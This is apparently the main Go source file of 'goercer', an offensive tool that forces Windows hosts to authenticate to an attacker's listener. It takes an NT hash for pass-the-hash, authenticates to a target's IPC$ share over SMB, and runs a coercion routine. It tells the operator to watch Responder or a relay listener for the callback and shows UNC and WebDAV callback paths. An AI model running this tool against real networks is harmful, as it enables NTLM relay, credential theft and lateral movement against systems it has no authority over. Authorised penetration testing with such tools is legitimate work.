package main

import (
	"fmt"
	"os"

	"goercer/internal/cli"
	"goercer/internal/coercer"
	"goercer/internal/config"
	"goercer/internal/ntlm"
	"goercer/internal/smbxport"
)

func main() {
	cfg := cli.Parse()

	// Resolve the 16-byte NT hash for pass-the-hash flows.
	if cfg.Hash != "" {
		hb, err := ntlm.DecodeHashHex(cfg.Hash)
		if err != nil {
			fmt.Printf("[!] Error: %v\n", err)
			os.Exit(1)
		}
		cfg.HashBytes = hb
	}

	out := coercer.NewOut(os.Stdout, cfg.Verbose, cfg.JSON)
	printMode(cfg, out)

	sess, err := smbxport.Connect(cfg.TargetIP, cfg.User, cfg.Domain, cfg.Password, cfg.HashBytes, cfg.ProxyURL)
	if err != nil {
		fmt.Printf("[!] Connection failed: %v\n", err)
		os.Exit(1)
	}
	defer sess.Close()
	out.Info("[+] SMB authenticated (IPC$)")

	if _, err := coercer.Run(sess, cfg, out); err != nil {
		out.Info("[!] Run finished with error: %v", err)
	}

	out.Info("[+] Check Responder / relay listener for callback!")
}

// printMode explains the callback path form so the operator can verify their
// listener configuration.
func printMode(cfg *config.Config, out *coercer.Out) {
	if cfg.Mode == config.ModeHTTP {
		out.Info("[*] HTTP/WebDAV mode, callback paths like \\\\%s\\test\\Settings.ini", cfg.Listener)
	} else {
		out.Info("[+] SMB/UNC mode using listener %s", cfg.Listener)
	}
}
